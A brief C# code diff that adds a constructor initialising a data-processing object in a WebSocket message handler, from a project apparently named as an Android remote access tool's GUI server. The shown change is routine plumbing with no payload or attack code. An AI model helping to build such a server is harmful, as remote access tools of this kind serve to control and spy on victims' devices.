@@ -9,7 +9,11 @@ namespace CSharp_droidRat_GUI_Server.Module.webSocket
     {
 
         private DataProcess _dataProcess;
-        
+
+        public WebSocket()
+        {
+            _dataProcess = new DataProcess();
+        }
         protected override void OnMessage(MessageEventArgs e)
         {
             var data = e.Data;
